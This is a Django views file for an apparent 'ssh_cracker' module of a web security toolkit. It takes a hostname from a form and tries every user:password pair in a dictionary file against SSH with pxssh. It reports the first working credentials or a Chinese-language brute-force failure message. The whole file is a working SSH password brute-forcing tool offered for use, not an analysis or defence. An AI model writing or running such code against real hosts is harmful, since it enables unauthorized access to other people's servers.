from django.shortcuts import render
import socket
from pexpect import pxssh
from django.contrib.auth.decorators import login_required

# Create your views here.
@login_required
def index(request):
    host=request.POST.get('hostname')
    if host:
        host=host.strip()
        host=socket.gethostbyname(host)
        user,passwd=login(host)
        if user==None and passwd==None:
            error=' 尝试爆破失败 '
            return render(request, 'ssh_cracker/index.html', {'host':host,'error': error})
        return render(request, 'ssh_cracker/index.html', {'host': host,'user':user,'passwd':passwd})
    return render(request,'ssh_cracker/index.html',{'host':host})


def login(host):

    with open('/var/python_test/test/django/web_security/static/dict/ssh_pwd.txt', 'r') as f: #部署修改
        for line in f.readlines():
            line=line.strip('\n')
            user,passwd=line.split(':')
            try:
                s = pxssh.pxssh()
                s.login(host,user,passwd)
                return user,passwd
            except:
                continue
        return None,None

